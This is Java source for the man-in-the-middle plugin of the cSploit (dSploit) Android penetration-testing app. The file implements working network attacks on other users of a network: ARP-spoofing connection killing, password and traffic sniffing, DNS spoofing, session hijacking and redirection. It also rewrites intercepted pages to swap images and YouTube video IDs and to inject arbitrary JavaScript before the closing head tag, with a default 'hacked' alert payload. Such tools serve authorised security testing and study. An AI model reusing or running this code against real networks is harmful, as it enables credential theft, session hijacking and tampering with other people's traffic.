/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.plugins.mitm;

import android.annotation.TargetApi;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore.MediaColumns;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import org.csploit.android.R;
import org.csploit.android.SettingsActivity;
import org.csploit.android.core.Child;
import org.csploit.android.core.ChildManager;
import org.csploit.android.core.Logger;
import org.csploit.android.core.Plugin;
import org.csploit.android.core.System;
import org.csploit.android.gui.dialogs.ChoiceDialog;
import org.csploit.android.gui.dialogs.ChoiceDialog.ChoiceDialogListener;
import org.csploit.android.gui.dialogs.ConfirmDialog;
import org.csploit.android.gui.dialogs.ConfirmDialog.ConfirmDialogListener;
import org.csploit.android.gui.dialogs.CustomFilterDialog;
import org.csploit.android.gui.dialogs.CustomFilterDialog.CustomFilterDialogListener;
import org.csploit.android.gui.dialogs.ErrorDialog;
import org.csploit.android.gui.dialogs.FinishDialog;
import org.csploit.android.gui.dialogs.InputDialog;
import org.csploit.android.gui.dialogs.InputDialog.InputDialogListener;
import org.csploit.android.gui.dialogs.RedirectionDialog;
import org.csploit.android.gui.dialogs.RedirectionDialog.RedirectionDialogListener;
import org.csploit.android.net.Target;
import org.csploit.android.net.http.proxy.Proxy;
import org.csploit.android.net.http.proxy.Proxy.ProxyFilter;
import org.csploit.android.plugins.mitm.SpoofSession.OnSessionReadyListener;
import org.csploit.android.plugins.mitm.hijacker.Hijacker;
import org.csploit.android.tools.ArpSpoof;

import java.io.BufferedReader;
import java.io.FileReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.regex.PatternSyntaxException;

//TODO: completely rewrite this class, it's monstrous
public class MITM extends Plugin
{
  private static final int SELECT_PICTURE = 1010;
  private static final int SELECT_SCRIPT = 1011;
  private static final Pattern YOUTUBE_PATTERN = Pattern.compile("youtube\\.com/.*\\?v=([a-z0-9_-]+)", Pattern.CASE_INSENSITIVE);

  private ListView mActionListView = null;
  private ActionAdapter mActionAdapter = null;
  private ArrayList<Action> mActions = new ArrayList<Action>();
  private Intent mImagePicker = null;
  private Intent mScriptPicker = null;
  private ProgressBar mCurrentActivity = null;
  private SpoofSession mSpoofSession = null;
  private Child mConnectionKillerProcess = null;

  static class Action{
    public int resourceId;
    public String name;
    public String description;
    public OnClickListener listener;

    public Action(String name, String description, int resourceId, OnClickListener listener){
      this.resourceId = resourceId;
      this.name = name;
      this.description = description;
      this.listener = listener;
    }

    public Action(String name, String description, OnClickListener listener){
      this(name, description, R.drawable.action_plugin, listener);
    }
  }

  class ActionAdapter extends ArrayAdapter<Action>{
    private int mLayoutId = 0;
    private ArrayList<Action> mActions;

    public class ActionHolder{
      ImageView icon;
      TextView name;
      TextView description;
      ProgressBar activity;
    }

    public ActionAdapter(int layoutId, ArrayList<Action> actions){
      super(MITM.this, layoutId, actions);

      mLayoutId = layoutId;
      mActions = actions;
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    @Override
    public View getView(int position, View convertView, ViewGroup parent){
      View row = convertView;
      ActionHolder holder = null;

      if(row == null){
        LayoutInflater inflater = (LayoutInflater) MITM.this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        row = inflater.inflate(mLayoutId, parent, false);
        if (getSharedPreferences("THEME", 0).getBoolean("isDark", false))
            row.setBackgroundResource(R.drawable.card_background_dark);
        holder = new ActionHolder();
        holder.icon = (ImageView) (row != null ? row.findViewById(R.id.actionIcon) : null);
        holder.name = (TextView) (row != null ? row.findViewById(R.id.itemName) : null);
        holder.description = (TextView) (row != null ? row.findViewById(R.id.itemDescription) : null);
        holder.activity = (ProgressBar) (row != null ? row.findViewById(R.id.itemActivity) : null);
        if(row != null) row.setTag(holder);

      } else holder = (ActionHolder) row.getTag();

      Action action = mActions.get(position);

      holder.icon.setImageResource(action.resourceId);
      holder.name.setText(action.name);
      holder.description.setText(action.description);

      if(row != null) row.setOnClickListener(action.listener);

      return row;
    }
  }

  public MITM(){
    super
      (
        R.string.mitm,
        R.string.mitm_desc,

        new Target.Type[]{Target.Type.ENDPOINT, Target.Type.NETWORK},
        R.layout.plugin_mitm,
        R.drawable.action_mitm
      );
  }

  @Override
  protected void onActivityResult(int request, int result, Intent intent){
    super.onActivityResult(request, result, intent);

    if(request == SELECT_PICTURE && result == RESULT_OK){
      try{
        Uri uri = intent.getData();
        String fileName = null,
          mimeType = null;

        if(uri != null){
          String[] columns = {MediaColumns.DATA};
          Cursor cursor = getContentResolver().query(uri, columns, null, null, null);
          cursor.moveToFirst();

          int index = cursor.getColumnIndex(MediaColumns.DATA);
          if(index != -1){
            fileName = cursor.getString(index);
          }

          cursor.close();
        }

        if(fileName == null){
          setStoppedState();
          new ErrorDialog( getString(R.string.error), getString(R.string.error_filepath2), MITM.this).show();
        } else{
          mimeType = System.getImageMimeType(fileName);
          mSpoofSession = new SpoofSession(true, true, fileName, mimeType);

          if(mCurrentActivity != null)
            mCurrentActivity.setVisibility(View.VISIBLE);

          mSpoofSession.start(new OnSessionReadyListener(){
            @Override
            public void onSessionReady(){
              MITM.this.runOnUiThread(new Runnable(){
                @Override
                public void run(){
                  System.getProxy().setFilter(new Proxy.ProxyFilter(){
                    @Override
                    public String onDataReceived(String headers, String data){
                      String resource = System.getServer().getResourceURL();

                      // handle img tags
                      data = data.replaceAll
                        (
                          "(?i)<img([^/]+)src=(['\"])[^'\"]+(['\"])",
                          "<img$1src=$2" + resource + "$3"
                        );

                      // handle css background declarations
                      data = data.replaceAll
                        (
                          "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*",
                          "background: url(" + resource + ")"
                        );

                      return data;
                    }
                  });

                  Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
                }
              });
            }

            @Override
            public void onError(String error, int resId){
              error = error == null ? getString(resId) : error;
              setSpoofErrorState(error);
            }
          });
        }
      }
      catch(Exception e){
        System.errorLogging(e);
      }
    } else if(request == SELECT_SCRIPT && result == RESULT_OK){
      String fileName = null;

      if(intent != null && intent.getData() != null)
        fileName = intent.getData().getPath();

      if(fileName == null){
        new ErrorDialog( getString(R.string.error), getString(R.string.error_filepath), MITM.this).show();
      } else{
        try{

          StringBuffer buffer = new StringBuffer();
          BufferedReader reader = new BufferedReader(new FileReader(fileName));
          char[] buf = new char[1024];
          int read = 0;
          String js = "";

          while((read = reader.read(buf)) != -1){
            buffer.append(String.valueOf(buf, 0, read));
          }
          reader.close();

          js = buffer.toString().trim();

          if(js.startsWith("<script") == false && js.startsWith("<SCRIPT") == false)
            js = "<script type=\"text/javascript\">\n" + js + "\n</script>\n";

          mCurrentActivity.setVisibility(View.VISIBLE);

          Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();

          final String code = js;
          mSpoofSession = new SpoofSession();
          mSpoofSession.start(new OnSessionReadyListener(){
            @Override
            public void onSessionReady(){
              System.getProxy().setFilter(new Proxy.ProxyFilter(){
                @Override
                public String onDataReceived(String headers, String data){
                  return data.replaceAll("(?i)</head>", code + "</head>");
                }
              });
            }

            @Override
            public void onError(String error, int resId){
              error = error == null ? getString(resId) : error;
              setSpoofErrorState(error);
            }
          });
        } catch(Exception e){
          new ErrorDialog(getString(R.string.error), getString(R.string.unexpected_file_error) + e.getMessage(), MITM.this).show();
        }
      }
    } else if(request == SettingsActivity.SETTINGS_DONE){
      new CheckForOpenPortsTask().execute();
    }
  }

  public class CheckForOpenPortsTask extends AsyncTask<Void, Void, Boolean>{
    private String mMessage = null;

    @Override
    protected Boolean doInBackground(Void... dummy){
            /*
             * Check if needed ports are available, otherwise inform the user.
	         */
      if(System.isPortAvailable(System.HTTP_PROXY_PORT) == false)
        mMessage = getString(R.string.the_port) + System.HTTP_PROXY_PORT + getString(R.string.error_proxy_port);

      else if(System.isPortAvailable(System.HTTP_SERVER_PORT) == false)
        mMessage = getString(R.string.the_port) + System.HTTP_SERVER_PORT + getString(R.string.error_mitm_port);

      else if(System.getSettings().getBoolean("PREF_HTTPS_REDIRECT", true) && System.isPortAvailable(System.HTTPS_REDIR_PORT) == false)
        mMessage = getString(R.string.the_port) + System.HTTPS_REDIR_PORT + getString(R.string.error_https_port);

      else
        mMessage = null;

      return true;
    }

    @Override
    protected void onPostExecute(Boolean result){
      if(mMessage != null){
        new ConfirmDialog( getString(R.string.warning), mMessage, MITM.this, new ConfirmDialogListener(){
          @Override
          public void onConfirm(){
            startActivityForResult(new Intent(MITM.this, SettingsActivity.class), SettingsActivity.SETTINGS_DONE);
          }

          @Override
          public void onCancel(){
            new FinishDialog(getString(R.string.error), getString(R.string.error_mitm_ports), MITM.this).show();
          }
        }).show();
      }
    }
  }

  private void setSpoofErrorState(final String error){
    MITM.this.runOnUiThread(new Runnable(){
      @Override
      public void run(){
        new ErrorDialog(getString(R.string.error), error, MITM.this).show();

        mCurrentActivity = null;
        setStoppedState();
      }
    });
  }

  private void setStoppedState(){
    int rows = mActionListView.getChildCount(),
      i;
    boolean somethingIsRunning = false;
    ActionAdapter.ActionHolder holder;
    View row;

    for(i = 0; i < rows && somethingIsRunning == false; i++){
      if((row = mActionListView.getChildAt(i)) != null){
        holder = (ActionAdapter.ActionHolder) row.getTag();
        if(holder.activity.getVisibility() == View.VISIBLE)
          somethingIsRunning = true;
      }
    }

    if(somethingIsRunning){
      Logger.debug("Stopping current jobs ...");

      if(mSpoofSession != null){
        mSpoofSession.stop();
        mSpoofSession = null;
      }

      for(i = 0; i < rows; i++){
        if((row = mActionListView.getChildAt(i)) != null){
          holder = (ActionAdapter.ActionHolder) row.getTag();
          holder.activity.setVisibility(View.INVISIBLE);
        }
      }
    }
  }

  @Override
  public void onCreate(Bundle savedInstanceState){
	  SharedPreferences themePrefs = getSharedPreferences("THEME", 0);
		Boolean isDark = themePrefs.getBoolean("isDark", false);
		if (isDark)
			setTheme(R.style.DarkTheme);
		else
			setTheme(R.style.AppTheme);
    super.onCreate(savedInstanceState);

    new CheckForOpenPortsTask().execute();

    mActionListView = (ListView) findViewById(R.id.actionListView);
    mActionAdapter = new ActionAdapter(R.layout.plugin_mitm_list_item, mActions);

    mActionListView.setAdapter(mActionAdapter);

    mImagePicker = new Intent(Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
    mImagePicker.setType("image/*");
    mImagePicker.putExtra(Intent.EXTRA_LOCAL_ONLY, true);

    mScriptPicker = new Intent();
    mScriptPicker.addCategory(Intent.CATEGORY_OPENABLE);
    mScriptPicker.setType("text/*");
    mScriptPicker.setAction(Intent.ACTION_GET_CONTENT);
    mScriptPicker.putExtra(Intent.EXTRA_LOCAL_ONLY, true);

    mActions.add(new Action
            (
                    getString(R.string.mitm_simple_sniff),
                    getString(R.string.mitm_simple_sniff_desc),
                    R.drawable.action_sniffer,
                    new OnClickListener() {
                      @Override
                      public void onClick(View v) {
                        if (System.checkNetworking(MITM.this) == false)
                          return;

                        setStoppedState();

                        startActivity
                                (
                                        new Intent
                                                (
                                                        MITM.this,
                                                        Sniffer.class
                                                )
                                );
                        overridePendingTransition(R.anim.fadeout, R.anim.fadein);
                      }
                    }));

    mActions.add(new Action
    (
      getString(R.string.mitm_password_sniff),
      getString(R.string.mitm_password_sniff_desc),
      R.drawable.action_passwords,
      new OnClickListener(){
        @Override
        public void onClick(View v){
          if(System.checkNetworking(MITM.this) == false)
            return;

          setStoppedState();

          startActivity
            (
              new Intent
                (
                  MITM.this,
                  PasswordSniffer.class
                )
            );
          overridePendingTransition(R.anim.fadeout, R.anim.fadein);
        }
      }));


      mActions.add(new Action
              (
               getString(R.string.mitm_dns_spoofing),
               getString(R.string.mitm_dns_spoofing_desc),
               R.drawable.action_redirect,
               new OnClickListener() {
               @Override
               public void onClick(View v) {
                    if (System.checkNetworking(MITM.this) == false)
                       return;

               setStoppedState();

               startActivity
               (
                  new Intent
                  (
                     MITM.this,
                     DNSSpoofing.class
                  )
               );
                 overridePendingTransition(R.anim.fadeout, R.anim.fadein);
                          }
      }));

    mActions.add(new Action
    (
      getString(R.string.mitm_session_hijack),
      getString(R.string.mitm_session_hijack_desc),
      R.drawable.action_hijack,
      new OnClickListener(){
        @Override
        public void onClick(View v){
          if(System.checkNetworking(MITM.this) == false)
            return;

          setStoppedState();

          startActivity
            (
              new Intent
                (
                  MITM.this,
                  Hijacker.class
                )
            );
          overridePendingTransition(R.anim.fadeout, R.anim.fadein);
        }
      }));

    mActions.add(new Action
    (
      getString(R.string.mitm_connection_kill),
      getString(R.string.mitm_connection_kill_desc),
      R.drawable.action_kill,
      new OnClickListener(){
        @Override
        public void onClick(View v){
          if(System.checkNetworking(MITM.this) == false)
            return;

          final ProgressBar activity = (ProgressBar) v.findViewById(R.id.itemActivity);

          if(activity.getVisibility() == View.INVISIBLE){
            if(System.getCurrentTarget().getType() != Target.Type.ENDPOINT)
              new ErrorDialog(getString(R.string.error), getString(R.string.mitm_connection_kill_error), MITM.this).show();

            else{
              setStoppedState();

              try {
                mConnectionKillerProcess = System.getTools().arpSpoof.spoof(System.getCurrentTarget(), new ArpSpoof.ArpSpoofReceiver() {

                  @Override
                  public void onStart(String cmd) {
                    super.onStart(cmd);
                    System.setForwarding(false);
                  }

                  @Override
                  public void onError(String line) {
                    MITM.this.runOnUiThread(new Runnable() {
                      @Override
                      public void run() {
                        Toast.makeText(MITM.this, "arpspoof error", Toast.LENGTH_LONG).show();
                        activity.setVisibility(View.INVISIBLE);
                      }
                    });
                  }
                });

                activity.setVisibility(View.VISIBLE);

                Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();
              } catch (ChildManager.ChildNotStartedException e) {
                Toast.makeText(MITM.this, getString(R.string.child_not_started), Toast.LENGTH_LONG).show();
              }
            }
          } else {

            if(mConnectionKillerProcess!=null) {
              mConnectionKillerProcess.kill(2);
              mConnectionKillerProcess = null;
            }

            activity.setVisibility(View.INVISIBLE);
          }
        }
      }));

    mActions.add(new Action
    (
      getString(R.string.mitm_redirect),
      getString(R.string.mitm_redirect_desc),
      R.drawable.action_redirect,
      new OnClickListener(){
        @Override
        public void onClick(View v){
          if(System.checkNetworking(MITM.this) == false)
            return;

          final ProgressBar activity = (ProgressBar) v.findViewById(R.id.itemActivity);

          if(activity.getVisibility() == View.INVISIBLE){
            setStoppedState();

            new RedirectionDialog( getString(R.string.mitm_redirection), MITM.this, new RedirectionDialogListener(){
              @Override
              public void onInputEntered(String address, String port){
                if(address.isEmpty() == false && port.isEmpty() == false){
                  try{
                    int iport = Integer.parseInt(port);

                    if(iport <= 0 || iport > 65535)
                      throw new Exception(getString(R.string.error_port_outofrange));

                    address = address.startsWith("http") ? address : "http://" + address;

                    URL url = new URL(address);
                    address = url.getHost();

                    activity.setVisibility(View.VISIBLE);
                    Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();


                    final String faddress = address;
                    final int fport = iport;

                    mSpoofSession = new SpoofSession();

                    mSpoofSession.start(new OnSessionReadyListener(){
                      @Override
                      public void onSessionReady(){
                        System.getProxy().setRedirection(faddress, fport);
                      }

                      @Override
                      public void onError(String error, int resId){
                        error = error == null ? getString(resId) : error;
                        setSpoofErrorState(error);
                      }
                    });

                  } catch(Exception e){
                    new ErrorDialog(getString(R.string.error), e.getMessage(), MITM.this).show();
                  }
                } else
                  new ErrorDialog(getString(R.string.error), getString(R.string.error_invalid_address_or_port), MITM.this).show();
              }
            }).show();
          } else
            setStoppedState();
        }
      }));

    mActions.add(new Action
    (
      getString(R.string.mitm_image_replace),
      getString(R.string.mitm_image_replace_desc),
      R.drawable.action_image,
      new OnClickListener(){
        @Override
        public void onClick(View v){
          if(System.checkNetworking(MITM.this) == false)
            return;

          final ProgressBar activity = (ProgressBar) v.findViewById(R.id.itemActivity);

          if(activity.getVisibility() == View.INVISIBLE){
            setStoppedState();

            new ChoiceDialog(MITM.this, getString(R.string.choose_source), new String[]{ getString(R.string.local_images), "Web URL"}, new ChoiceDialogListener(){
              @Override
              public void onChoice(int choice){
                if(choice == 0){
                  try{
                    mCurrentActivity = activity;
                    startActivityForResult(mImagePicker, SELECT_PICTURE);
                  } catch(ActivityNotFoundException e){
                    new ErrorDialog(getString(R.string.error), getString(R.string.error_image_intent), MITM.this).show();
                  }
                } else{
                  new InputDialog
                    (
                      getString(R.string.image),
                      getString(R.string.enter_image_url),
                      "",
                      true,
                      false,
                      MITM.this,
                      new InputDialogListener(){
                        @Override
                        public void onInputEntered(String input){
                          String image = input.trim();

                          if(image.isEmpty() == false){
                            image = image.startsWith("http") ? image : "http://" + image;

                            activity.setVisibility(View.VISIBLE);

                            final String resource = image;
                            mSpoofSession = new SpoofSession();
                            try {
                              mSpoofSession.start(new OnSessionReadyListener(){
                                @Override
                                public void onSessionReady(){
                                  System.getProxy().setFilter(new ProxyFilter(){
                                    @Override
                                    public String onDataReceived(String headers, String data){
                                      // handle img tags
                                      data = data.replaceAll
                                        (
                                          "(?i)<img([^/]+)src=(['\"])[^'\"]+(['\"])",
                                          "<img$1src=$2" + resource + "$3"
                                        );

                                      // handle css background declarations
                                      data = data.replaceAll
                                        (
                                          "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*",
                                          "background: url(" + resource + ")"
                                        );

                                      return data;
                                    }
                                  });
                                }

                                @Override
                                public void onError(String error, int resId){
                                  error = error == null ? getString(resId) : error;
                                  setSpoofErrorState(error);
                                }
                              });

                              Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();

                            } catch (ChildManager.ChildNotStartedException e) {
                              Toast.makeText(MITM.this, getString(R.string.child_not_started), Toast.LENGTH_LONG).show();
                            }
                          } else
                            new ErrorDialog(getString(R.string.error), getString(R.string.error_image_url), MITM.this).show();
                        }
                      }
                    ).show();
                }
              }
            }).show();


          } else{
            mCurrentActivity = null;
            setStoppedState();
          }
        }
      }));

    mActions.add(new Action
    (
      getString(R.string.mitm_video_replace),
      getString(R.string.mitm_video_replace_desc),
      R.drawable.action_youtube,
      new OnClickListener(){
        @Override
        public void onClick(View v){
          if(System.checkNetworking(MITM.this) == false)
            return;

          final ProgressBar activity = (ProgressBar) v.findViewById(R.id.itemActivity);

          if(activity.getVisibility() == View.INVISIBLE){
            setStoppedState();

            new InputDialog
              (
                getString(R.string.video),
                getString(R.string.enter_video_url),
                "http://www.youtube.com/watch?v=dQw4w9WgXcQ",
                true,
                false,
                MITM.this,
                new InputDialogListener(){
                  @Override
                  public void onInputEntered(String input){
                    final String video = input.trim();
                    Matcher matcher = YOUTUBE_PATTERN.matcher(input);

                    if(video.isEmpty() == false && matcher != null && matcher.find()){
                      final String videoId = matcher.group(1);

                      mSpoofSession = new SpoofSession();
                      try {
                        mSpoofSession.start(new OnSessionReadyListener(){
                          @Override
                          public void onSessionReady(){
                            System.getProxy().setFilter(new ProxyFilter(){
                              @Override
                              public String onDataReceived(String headers, String data){
                                if(data.matches("(?s).+/v=[a-zA-Z0-9_-]+.+"))
                                  data = data.replaceAll("(?s)/v=[a-zA-Z0-9_-]+", "/v=" + videoId);

                                else if(data.matches("(?s).+/v/[a-zA-Z0-9_-]+.+"))
                                  data = data.replaceAll("(?s)/v/[a-zA-Z0-9_-]+", "/v/" + videoId);

                                else if(data.matches("(?s).+/embed/[a-zA-Z0-9_-]+.+"))
                                  data = data.replaceAll("(?s)/embed/[a-zA-Z0-9_-]+", "/embed/" + videoId);

                                return data;
                              }
                            });
                          }

                          @Override
                          public void onError(String error, int resId){
                            error = error == null ? getString(resId) : error;
                            setSpoofErrorState(error);
                          }
                        });

                        activity.setVisibility(View.VISIBLE);

                        Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();

                      } catch (ChildManager.ChildNotStartedException e) {
                        System.errorLogging(e);
                        Toast.makeText(MITM.this, getString(R.string.child_not_started), Toast.LENGTH_LONG).show();
                      }
                    } else
                      new ErrorDialog(getString(R.string.error), getString(R.string.error_video_url), MITM.this).show();
                  }
                }
              ).show();
          } else
            setStoppedState();
        }
      }));

    mActions.add(new Action
    (
      getString(R.string.mitm_script_injection),
      getString(R.string.mitm_script_injection_desc),
      R.drawable.action_injection,
      new OnClickListener(){
        @Override
        public void onClick(View v){
          if(System.checkNetworking(MITM.this) == false)
            return;

          final ProgressBar activity = (ProgressBar) v.findViewById(R.id.itemActivity);

          if(activity.getVisibility() == View.INVISIBLE){
            setStoppedState();

            new ChoiceDialog(MITM.this, getString(R.string.choose_method), new String[]{ getString(R.string.local_files), getString(R.string.custom_code)}, new ChoiceDialogListener(){
              @Override
              public void onChoice(int choice){
                if(choice == 0){
                  try{
                    mCurrentActivity = activity;
                    startActivityForResult(mScriptPicker, SELECT_SCRIPT);
                  } catch(ActivityNotFoundException e){
                    new ErrorDialog(getString(R.string.error), getString(R.string.error_file_intent), MITM.this).show();
                  }
                } else{
                  new InputDialog
                    (
                      "Javascript",
                      getString(R.string.enter_js_code),
                      "<script type=\"text/javascript\">\n" +
                        "  alert('This site has been hacked with cSploit!');\n" +
                        "</script>",
                      true,
                      false,
                      MITM.this,
                      new InputDialogListener(){
                        @Override
                        public void onInputEntered(String input){
                          final String js = input.trim();
                          if(js.isEmpty() == false || js.startsWith("<script") == false){

                            mSpoofSession = new SpoofSession();
                            try {
                              mSpoofSession.start(new OnSessionReadyListener(){
                                @Override
                                public void onSessionReady(){
                                  System.getProxy().setFilter(new ProxyFilter(){
                                    @Override
                                    public String onDataReceived(String headers, String data){
                                      return data.replaceAll("(?i)</head>", js + "</head>");
                                    }
                                  });
                                }

                                @Override
                                public void onError(String error, int resId){
                                  error = error == null ? getString(resId) : error;
                                  setSpoofErrorState(error);
                                }
                              });

                              activity.setVisibility(View.VISIBLE);

                              Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();

                            } catch (ChildManager.ChildNotStartedException e) {
                              System.errorLogging(e);
                              Toast.makeText(MITM.this, getString(R.string.child_not_started), Toast.LENGTH_LONG).show();
                            }
                          } else
                            new ErrorDialog(getString(R.string.error), getString(R.string.error_js_code), MITM.this).show();
                        }
                      }
                    ).show();
                }
              }

            }).show();
          } else{
            mCurrentActivity = null;
            setStoppedState();
          }
        }
      }));

    mActions.add(new Action
    (
      getString(R.string.mitm_custom),
      getString(R.string.mitm_custom_desc),
      new OnClickListener(){
      @Override
      public void onClick(View v){
        if(System.checkNetworking(MITM.this) == false)
          return;

        final ProgressBar activity = (ProgressBar) v.findViewById(R.id.itemActivity);

        if(activity.getVisibility() == View.INVISIBLE){
          setStoppedState();

          new CustomFilterDialog( getString(R.string.custom_filter), MITM.this, new CustomFilterDialogListener(){
            @Override
            public void onInputEntered(final ArrayList<String> from, final ArrayList<String> to){

              if(from.isEmpty() == false && to.isEmpty() == false){
                try{
                  for(String exp : from){
                    Pattern.compile(exp);
                  }

                  mSpoofSession = new SpoofSession();
                  mSpoofSession.start(new OnSessionReadyListener(){
                    @Override
                    public void onSessionReady(){
                      System.getProxy().setFilter(new ProxyFilter(){
                        @Override
                        public String onDataReceived(String headers, String data){
                          for(int i = 0; i < from.size(); i++){
                            data = data.replaceAll(from.get(i), to.get(i));
                          }

                          return data;
                        }
                      });
                    }

                    @Override
                    public void onError(String error, int resId){
                      error = error == null ? getString(resId) : error;
                      setSpoofErrorState(error);
                    }
                  });

                  activity.setVisibility(View.VISIBLE);

                  Toast.makeText(MITM.this, getString(R.string.tap_again), Toast.LENGTH_LONG).show();

                } catch(PatternSyntaxException e){
                  new ErrorDialog(getString(R.string.error), getString(R.string.error_filter) + ": " + e.getDescription() + " .", MITM.this).show();
                } catch (ChildManager.ChildNotStartedException e) {
                  System.errorLogging(e);
                  Toast.makeText(MITM.this, getString(R.string.child_not_started), Toast.LENGTH_LONG).show();
                }
              } else
                new ErrorDialog(getString(R.string.error), getString(R.string.error_filter), MITM.this).show();
            }
          }
          ).show();
        } else
          setStoppedState();
      }
    }));
  }

  @Override
  public void onBackPressed(){
    setStoppedState();
    super.onBackPressed();
    overridePendingTransition(R.anim.fadeout, R.anim.fadein);
  }
}
